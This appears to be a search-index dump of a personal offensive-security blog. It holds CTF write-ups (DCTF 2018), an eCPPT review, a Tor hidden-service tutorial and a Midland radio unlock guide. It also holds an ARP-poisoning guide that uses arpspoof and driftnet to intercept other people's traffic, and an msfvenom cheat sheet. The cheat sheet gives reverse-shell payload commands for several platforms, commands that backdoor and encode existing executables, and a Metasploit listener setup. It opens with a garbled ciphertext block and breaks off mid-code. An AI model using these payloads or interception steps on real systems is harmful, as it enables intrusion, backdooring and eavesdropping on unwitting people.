asdfghwsxcdeqwertyiuyhnbvqwertyytrfvcxqwertywsxcdezxcvbnxsweftgbzxcvbnrtyuihnasdfghedcqwertyxcvbgrdasdfghedcvbqwertyrfvbnqwertyefvtqwerty zxcvbnedcvbgtasdfghxsweftbgzxcvbntrfvbasdfghrfvgyhnqwertygrdxcvbasdfghxsweftgbasdfghcvgredasdfghwsxcdezxcvbnwsxcfezxcvbn.qwerty qwertyrfvasdfghrtyuihnzxcvbn qwertyefvgywdcftzxcvbngrdxcvbzxcvbniuyhnbvasdfgh qwertynbvcxswerfqwertywsxcvfrezxcvbnmnbvccdertgasdfghedcvbgtzxcvbnrfvbnasdfghxcvbgrdzxcvbnmnbvcdrtghuasdfghwsxzxcvbniuyhnbvzxcvbnedcvrfzxcvbnedcvgrzxcvbn zxcvbnwsxqwertyzaqwdvfrqwerty qwertyrtyuihnqwertyrfvgyhnqwertywsxcdezxcvbn zxcvbn1qwerty9asdfgh6zxcvbn0zxcvbniuyhnbvqwerty asdfghefvgywdcftasdfghwsxzxcvbnrtyuihnzxcvbnwsxdrfvasdfgh asdfghwertyfvasdfghrfvgyhnzxcvbnwsxcdezxcvbn qwertymnbvcdrtghuzxcvbnedcvrfzxcvbnwsxcvzxcvbntgbnhyasdfghgrdxcvbasdfghiuyhnbvzxcvbnedcvrfqwerty qwertyqazxcdewzxcvbnewsxdasdfgh asdfghedcvbzxcvbnedcvrfzxcvbnwertyfvzxcvbnmnbvcdrtghuzxcvbnzsefvcxqwertyiuyhnbvasdfghtgbnhyzxcvbnrtyuihnasdfgh qwertyiuyhnbvzxcvbnrfvgyhnqwertytgbnhyqwertytgbnhyzxcvbnrtyuihnasdfghiuyhnbvzxcvbn asdfghtrfvbqwertyrfvbnhytqwertyzaqwdvfrqwertyrtyuihnzxcvbngrdxcvbzxcvbnwsxqwertyxsweftgbzxcvbnwsxqwertyxsweftgbzxcvbncvgredqwerty zxcvbnedcvbzxcvbnrfvbnhytzxcvbnmnbvcdrtghuasdfghtgbnhyasdfghxsweftyhnqwerty qwertywsxzxcvbnnbvcxswefrasdfghytrfvcxasdfghedcvbgtqwertyxsweftyhnasdfgh qwertynbvcxswerfqwertyzsefvcxasdfghiuyhnbvasdfghiuyhnbvasdfghxcvbgrdasdfghredcvgasdfghtgbnhyzxcvbnytrfvcxasdfgh,asdfgh zxcvbnzsefvcxqwertyxsweftgbqwertyedcvgrzxcvbn qwertyzaqwdrtgbqwertywsxcvfrezxcvbnmnbvcdrtghuzxcvbnwsxcdezxcvbn zxcvbnmnbvcdrtghuasdfghedcvrfasdfghredcvqwertytgbnhyqwertyxsweftbgasdfghrtyuihnqwertyedcvbqwertyefvtzxcvbn qwertyefvgywdcftzxcvbnedczxcvbnwertyfvqwertywsxdrfvasdfgh zxcvbnwsxcfeasdfghedcvrfqwertyiuyhnbvasdfghedcfbyasdfghwertyfvqwertywsxcvfreasdfghnbvcxswerfqwerty asdfghnbvcxswefrqwertyedcvbgtzxcvbnwsxcfdqwertywsxcvqwertyedcqwertyytrfvcxasdfghwsxdrfvasdfghedczxcvbnxsweftgbzxcvbncvrgedzxcvbn asdfghiuyhnbvasdfghrfvbnhytasdfghtrfvgqwertyrtyuihnasdfghefvgywdcftasdfghzsefvcxasdfghmnbvcdrtghuasdfghtgbnhyzxcvbn asdfghrfvbnzxcvbnwsxqwertywsxdvrqwertywsxcdeasdfgh zxcvbnxcvbgrdasdfghwsxcvzxcvbnyhnmkuqwertyedcvbgtzxcvbniuyhnbvasdfgh zxcvbnnbvcxswerfasdfghzsefvcxqwertycvgredasdfghedcvrfasdfghxsweftynhqwertyxcvbgrdasdfghwsxdvrasdfghedcvrfasdfghmnbvcdrtghuqwerty asdfghrfvasdfghxsweftgbqwertyewsxczxcvbnwsxcvasdfghwsxcvfrqwertyyhnmkuzxcvbnwsxzxcvbnxsweftbgqwertycvgredqwerty asdfghefvgyzxcvbnedcvrfzxcvbnmnbvcdrtghuqwertyiuyhnbvqwertywsxzxcvbnwsxcvfrezxcvbnxsweftbgzxcvbniuyhnbvqwerty asdfghwsxcvfreqwertyredcfqwerty asdfghedcvbqwertyqazxcdewasdfghmnbvcdrtghuasdfghwsxcdeqwertyxsweftynhqwerty qwertyedcqwertymnbvccdertgzxcvbniuyhnbvasdfghwsxcvfrqwertyzaqwdrtgbqwerty.asdfgh\")Example run:The flag is: DCTF{b66ecaaa90ad05df5dab33d71a8f70934408f3a5847a4c5c38db75891b0f0e32}" }, { "title": "[DCTF Quals 2018] Broken TV", "url": "/nitesculucian.github.io/2018/09/29/dctf-2018-broken-tv/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2018, writeups, CTF, challange", "date": "2018-09-29 21:18:00 +0300", "snippet": "Description:Guys, I’ve asked Google for this flag! But my only monitor is this Broken TV… Target: https://broken-tv.dctfq18.def.camp/Author:Lucian NitescuStats:83 point / 73 solversSolution:The cha...", "content": "Description:Guys, I’ve asked Google for this flag! But my only monitor is this Broken TV… Target: https://broken-tv.dctfq18.def.camp/Author:Lucian NitescuStats:83 point / 73 solversSolution:The challenge started with this simple website:We can observe that the following image is changed at about 1 minute:Using the following Python script we can extract only the scren image with the shifted pixels.from PIL import Image from PIL import ImageFilterroom = Image.open(\"./blur.png\")cropped = room.crop(( 446, 330, 1380, 839)) cropped.save(\"e.png\")Result:Knowing this is an identifiable Google search we can use the whitespace in order to guide our line shifting. Using OCR, I was able to decode the image and obtain the flag.from PIL import Image from PIL import ImageFilterimport numpy as npimport randomfrom random import randinttry: import Imageexcept ImportError: from PIL import Imageimport pytesseractfrom multiprocessing import Processfrom multiprocessing import Pool, TimeoutErrorimport osdef rotate(l, y=1): if len(l) == 0: return l y = -y % len(l) return l[y:] + l[:y]def removedup(duplicate): final_list = [] for num in duplicate: if num not in final_list: final_list.append(num) return final_listim = Image.open(\"./e.png\")pixels = list(im.getdata())width, height = im.sizepixels = [pixels[i * width:(i + 1) * width] for i in xrange(height)]i = 0 while (1): for x in range(220, 260): width = 0 while ((pixels[x][0] == (255, 255, 255)) and (width != 934)): \t# this insane hardcodation is used to filter out the whitespace to the right edge while (pixels[x][-400:] != [(255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255), (255, 255, 255)]): pixels[x] = rotate(pixels[x], -1) pixels[x] = rotate(pixels[x], -1) # print \"rotatie\" width += 1 pixel = np.array(pixels, dtype=np.uint8) im = Image.fromarray(pixel) for x in range(220, 260): pixels[x] = rotate(pixels[x], -1) text = pytesseract.image_to_string(im) print text if \"DC TF\" in text: im.save(\"flag.png\") break i = i + 1 print str(i) + \"\\n\"After a while it will obtain:The flag was: DCTF{1e20cabc8098b16cfeefb05af0a9032bb953871d6d627e7f88b81d1a3c5fa809}" }, { "title": "eCPPT Gold Review", "url": "/nitesculucian.github.io/2018/09/05/ecppt-review/", "categories": "review, certification, offensive_security", "tags": "offensive security, cheat sheet, sniffing, mitm, arp", "date": "2018-09-05 01:13:00 +0300", "snippet": "On the 23rd of August 2018, I have passed the eCPPT Gold v1.0 Certification. eCPPT stands for eLearnSecurity Certified Professional Penetration Tester and the ECPPT Gold was the designation for ECP...", "content": "On the 23rd of August 2018, I have passed the eCPPT Gold v1.0 Certification. eCPPT stands for eLearnSecurity Certified Professional Penetration Tester and the ECPPT Gold was the designation for ECPPTv1. At the moment of this article, note that you can not obtain this certification anymore and that the newest version of this certification is ECPPTv2. Anyway, both of them certify that you are an eLearnSecurity Certified Professional Penetration Tester and you have achieved the certification by performing a tough enough practical penetration testing on a simulated corporation.eCPPT Pre-RequisitesEverything you’ll need to know to pass the exam is taught on the course, however, in my opinion, it won’t harm you to take note of the following key points: You should have a minimal experience in penetration testing. Some skill is needed to be sure you will fit in the 7 day test period. You should be enthusiasm for learning something new You should be patience Hacker mindset Familiarity with both Windows and Linux Ability to read and write code (especially in Python and C/C++) You should not rely on tools. Nessus, Nexpose, Burp Suite Scanner etc. - they won’t work, they will make you lose more time. Even simple things like Metasploit or Nmap will fail on you in the middle of the certification exam.The Training PackageIn short, the course for the eCCPT Certification includes the following topics: Penetration testing processes and methodologies Vulnerability Assessment of Networks Vulnerability Assessment of Web Applications Advanced Exploitation with Metasploit Performing Attacks in Pivoting Web application Manual exploitation Information Gathering and Reconnaissance Scanning and Profiling the target Privilege escalation and Persistence Exploit Development Advanced Reporting skills and RemediationEverything is fitted in 4 main categories with 26 modules and 22 labs. There is one extra category if you take the most expensive package and you want to learn some Ruby, but I will say that this is not the key aspect for your certification. Note that even if you do not take the most expensive package, you still have access to the Ruby-related labs.This so-called training will get you ready and able to both identify and exploit vulnerabilities at the available levels but will also learn you how to report what you should report and how.After all, the life of a Security Consultant / Penetration Tester / Security Specialist is always defined by the quality of his worked presented by a report.The ExamYou have exactly 7 days of testing and another 7 days for writing the report which should be uploaded until the end of the time frames. At the beginning of this certification exam, you will be presented with a so-called later of engagement that should state all the minimal requirements to pass (it also states that the minimum requirements are not enough to pass).My later of engagement told me the following things: Discover all hosts in all LANs Report any vulnerability on all hosts Obtain root access level on one specific server on one specific segregated network (yes, there are more than one) Do not overestimate the web vulnerabilities That I am allowed to use any technics and tools I want. Very nice joke! Nope. Do it as manually as you can! This is not a CTF (Capture the Flag - Competition) and some things might not be vulnerable at all. Learned it by the hard way. I can confirm that. You can fail the certification on the quality of the reportFunny but I broked all the vulnerable machines, found all vulnerabilities in 4-5 days and wanted to break the last of them. After 48 hours (3.5 hours of sleep), of smart ideas and newly discovered methods and ways I did not obtain access to all hosts and after consulting the forum I discovered that there was not a single way of doing it. After that, I wrote my report and uploaded it to the platform. After a while I received this:My Exam Tips Take note of everything, make printscreens, write the draft report in the first 6 days of the testing time frame and take one day of putting all together. Do not really on commercial or non-commercial tools. They all have their problems and eLearnSecurity knows exactly how to play with them! Take a break, eat, sleep, wash, relax, hack and repeat! Is an open book exam. It might help you. “Try harder!” Save all pieces of information and all files Find workarounds on any issue or problem, think out of the box.Dear reader, good luck with your endeavors!" }, { "title": "Driftnet with ARP Poisoning", "url": "/nitesculucian.github.io/2018/08/01/driftnet-with-arp-poisoning/", "categories": "sniffing, offensive_security", "tags": "offensive security, cheat sheet, sniffing, mitm, arp", "date": "2018-08-01 01:09:00 +0300", "snippet": "https://github.com/deiv/driftnetDriftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn’t be used by anyone an...", "content": "https://github.com/deiv/driftnetDriftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn’t be used by anyone anywhere. It can also extract MPEG audio data from the network and play it. If you live in a house with thick walls, this may be a useful way to find out about your neighbours’ musical taste.Installingsudo apt-get install driftnet\tPreparing the machineAs root:echo 1 &gt; /proc/sys/net/ipv4/ip_forwardARP PoisoningAs any user we have to create an arp poisoning in two different terminals:sudo arpspoof -i tap0 -t &lt;target 1 ip&gt; -r &lt;target 2 ip or gateway&gt;sudo arpspoof -i tap0 -t &lt;target 2 ip or gateway&gt; -r &lt;target 1 ip&gt;In order to begin collecting images:sudo driftnet -i &lt;network interface&gt;The article image is a live example of HTTP delivered website and you can observe all the icons and the placeholder images." }, { "title": "Common Network Sniffing Tools", "url": "/nitesculucian.github.io/2018/08/01/common-network-sniffing-tools/", "categories": "tools, offensive_security", "tags": "offensive security, cheat sheet, sniffing, mitm, arp", "date": "2018-08-01 00:08:00 +0300", "snippet": "In this article, I am going to list (not explain) some common packet sniffers and network analyzers that you can use now in any man-in-the-middle attack (MITM).What you have to keep in mind, is tha...", "content": "In this article, I am going to list (not explain) some common packet sniffers and network analyzers that you can use now in any man-in-the-middle attack (MITM).What you have to keep in mind, is that there is no perfect tool for doing the perfect MITM attack and you will have to adapt your technics in order to better match your objectives.DSNIFFhttps://www.monkey.org/~dugsong/dsniff/dsniff is a collection of tools for network auditing and penetration testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.). arpspoof, dnsspoof, and macof facilitate the interception of network traffic normally unavailable to an attacker (e.g, due to layer-2 switching). sshmitm and webmitm implement active monkey-in-the-middle attacks against redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.driftnethttps://github.com/deiv/driftnetDriftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn’t be used by anyone anywhere. It can also extract MPEG audio data from the network and play it. If you live in a house with thick walls, this may be a useful way to find out about your neighbours’ musical taste.WIRESHARKhttps://www.wireshark.org/Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.TCPDUMPhttps://www.tcpdump.org/manpages/tcpdump.1.htmltcpdump is a common packet analyzer that runs under the command line. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.WINDUMPhttps://www.winpcap.org/windump/WinDump is the Windows version of tcpdump, the command line network analyzer for UNIX. WinDump is fully compatible with tcpdump and can be used to watch, diagnose and save to disk network traffic according to various complex rules. It can run under Windows 95, 98, ME, NT, 2000, XP, 2003 and Vista.ETTERCAPhttps://www.ettercap-project.org/Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.BETTERCAPhttps://www.bettercap.org/bettercap is the Swiss army knife for network attacks and monitoring.NetworkMinerhttps://www.netresec.com/index.ashx?page=NetworkMinerNetworkMiner is an open source Network Forensic Analysis Tool (NFAT) for Windows (but also works in Linux / Mac OS X / FreeBSD). NetworkMiner can be used as a passive network sniffer/packet capturing tool in order to detect operating systems, sessions, hostnames, open ports etc. without putting any traffic on the network. NetworkMiner can also parse PCAP files for off-line analysis and to regenerate/reassemble transmitted files and certificates from PCAP files." }, { "title": "Create a Tor Website in 5 minutes", "url": "/nitesculucian.github.io/2018/07/25/create-a-tor-website-in-5-minutes/", "categories": "tutorials", "tags": "Tor, TheOnionRouting, dark net, dark web", "date": "2018-07-25 02:08:00 +0300", "snippet": "General informationWhat is Tor?Tor is free software and an open network that helps you defend against traffic analysis, a form of network surveillance that threatens personal freedom and privacy, c...", "content": "General informationWhat is Tor?Tor is free software and an open network that helps you defend against traffic analysis, a form of network surveillance that threatens personal freedom and privacy, confidential business activities and relationships, and state security.Why Anonymity MattersTor protects you by bouncing your communications around a distributed network of relays run by volunteers all around the world: it prevents somebody watching your Internet connection from learning what sites you visit, and it prevents the sites you visit from learning your physical location.Source: https://www.torproject.org/Installation and routingPersonally, when I need a simple Tor Website I use a VM or a physical machine with a live booted a Linux based OS (in general the Ubuntu 16.04). This tutorial is actually for Ubuntu 16.04 in virtual box and feel free to change it to your needs.Step 1: VM and Network Interface Make a fresh new VM. Configure interface in bridged mode. Boot Ubuntu 16.04 live ISO. Do not install Ubuntu and choose “Try Ubuntu”Step 2: Install Nginx sudo apt install nginx sudo rm /etc/nginx/sites-available/default sudo nano /etc/nginx/sites-available/default Add the followings to the new /etc/nginx/sites-available/default and save:server { listen 127.0.0.1:8080 default_server; server_name localhost; root /usr/share/nginx/html; index index.html index.htm; location / { allow 127.0.0.1; deny all; }}Step 3: Install Tor for the website sudo nano /etc/apt/sources.list Append and save: deb http://deb.torproject.org/torproject.org xenial main Go to https://www.torproject.org/docs/debian.html.en and retrive the followings:gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add - Proceed with the instalation:sudo apt updatesudo apt install tor deb.torproject.org-keyring Proceed with the configuration:sudo nano /etc/tor/torrcReplace:#HiddenServiceDir /var/lib/tor/hidden_service/##HiddenServicePort 80 127.0.0.1:80With:HiddenServiceDir /var/lib/tor/hidden_service/HiddenServicePort 80 127.0.0.1:8080Step 4: Fire it up!sudo service nginx restartsudo service tor restartTo retrive the website .onion link:cat /var/lib/tor/hidden_service/hostnameYour websites html files can be found in /usr/share/nginx/html" }, { "title": "Msfvenom Cheat Sheet", "url": "/nitesculucian.github.io/2018/07/25/msfvenom-cheat-sheet/", "categories": "cheatsheet, offensive_security", "tags": "offensive security, cheat sheet, reverse shell, backdoor, bash, perl, python, PHP", "date": "2018-07-25 00:58:00 +0300", "snippet": "MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.Binaries Command Info msfvenom -p windows/meterpreter/reverse_tc...", "content": "MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.Binaries Command Info msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &gt; example.exe Creates a simple TCP Payload for Windows msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &gt; example.exe Creates a simple HTTP Payload for Windows msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf &gt; example.elf Creates a simple TCP Shell for Linux msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho &gt; example.macho Creates a simple TCP Shell for Mac msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R &gt; example.apk Creats a simple TCP Payload for Android Web Payloads Command Info msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw &gt; example.php Creats a Simple TCP Shell for PHP msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp &gt; example.asp Creats a Simple TCP Shell for ASP msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw &gt; example.jsp Creats a Simple TCP Shell for Javascript msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war &gt; example.war Creats a Simple TCP Shell for WAR Windows Payloads Command Info msfvenom -l encoders Lists all avalaible encoders msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe &gt; example.exe Binds an exe with a Payload (Backdoors an exe) msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\\x00’ -i 3 -f exe &gt; example.exe Creates a simple TCP payload with shikata_ga_nai encoder msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\\x00” -f exe &gt; example.exe Binds an exe with a Payload and encodes it How do I get the meterprater shell?nli@nlistation:~$ sudo msfconsolemsf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.123lhost =&gt; 192.168.1.123msf exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf exploit(multi/handler) &gt; run" }, { "title": "Midland CT590 frequency extender (RX/TX unlock)", "url": "/nitesculucian.github.io/2018/07/23/midland-ct590-frequency-extender-unlock/", "categories": "radio, radioamateur, modding", "tags": "Midland, CT590, frequency extender, RX/TX, unlock, hack, tutorial, solution, C1317, VHF, UHF", "date": "2018-07-23 00:00:00 +0300", "snippet": "Recently I have bought a MIDLAND CT590 VHF/UHF (C1317) which is a portable radio station for radio amateurs.By itself the radio station supports the following frequencies:144-146MHz VHF 430-440MHz ...", "content": "Recently I have bought a MIDLAND CT590 VHF/UHF (C1317) which is a portable radio station for radio amateurs.By itself the radio station supports the following frequencies:144-146MHz VHF 430-440MHz UHFPersonally, I needed this radio station to talk with other PMR radios which are on 446.XXX frequency. Therefore I had to unlock my radio station (remove the limitations) to be allowed to speak on 446 bands. Unfortunately enough, the radio station had no public tutorial so I decided to do one:After sending an email to Midland, they provided me with the following steps:Italian VersionESPANSIONE BANDA LAVORO CT590Nelle radio CT590 sara possibile cambiare/estendere la banda operativa della radio tramite questa semplice procedura:Allargamento range ricezione e trasmissione: Accendere la radio tenendo premuto il tasto 1. Lo schermo LCD mostrerà la voce “set”. Premere MENU, il display mostrerà in basso l’attuale range di frequenza in VHF. Inserire la banda operativa desiderata, ad esempio se si vuole lavorare da 136 a 174MHZ in VHFinserire il codice “136174”. Attenzione: a seguito dell’introduzione di ogni singola cifra occorrepremere il tasto “menu” per poter inserire la cifra successiva. Al termine dell’inserimento del range di frequenza in VHF premere menu per passare alle UHF. Inserire la banda operativa desiderata, ad esempio se si vuole lavorare da 400 a 520 MHZ in UHFinserire il codice “400520”. Attenzione: a seguito dell’introduzione di ogni singola cifra occorrepremere il tasto “menu” per poter inserire la cifra successiva. Al termine della procedura premere “menu” per confermare. Attendere il boot della radio.English VersionTo unlock MIDLAND CT590 it is necessary to follow the next steps:RX/TX unlock: Press “1” and turn on the radio at the same time—then the LCD will show “Set” For Extend the band to 136-174 and 400-520, Press “Menu”—input “1”—Press “Menu”—input “3”–-Press “Menu”—input “6”—Press “Menu”—input “1”—Press “Menu”—input “7”—Press Menu—input “4”—Press Menu—input “4”—Press Menu—input “0”—Press Menu—input “0”—Press Menu-–input “5”—Press “Menu”—input “2”—Press “Menu”—input “0” Press “Menu”—The operation is done and the radio will reboot." }, { "title": "Exploit Exercises: Nebula Level 10", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-10/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:49:00 +0300", "snippet": "The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.To do this level, log in as the level10 account with the...", "content": "The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.Source code(basic.c)#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ char *file; char *host; if(argc &lt; 3) { printf(\"%s file host\\n\\tsends file to host if you have access to it\\n\", argv[0]); exit(1); } file = argv[1]; 